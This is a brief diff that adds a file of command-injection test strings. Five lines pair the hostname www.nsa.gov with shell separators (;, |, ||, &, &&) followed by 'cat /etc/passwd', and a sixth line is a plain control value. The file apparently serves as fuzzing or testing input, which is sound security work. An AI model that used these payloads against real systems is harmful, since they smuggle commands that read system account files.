@@ -1,0 +1,6 @@
+www.nsa.gov ;cat /etc/passwd		
+www.nsa.gov |cat /etc/passwd
+www.nsa.gov ||cat /etc/passwd
+www.nsa.gov &cat /etc/passwd
+www.nsa.gov &&cat /etc/passwd
+www.nsa.govthisistest
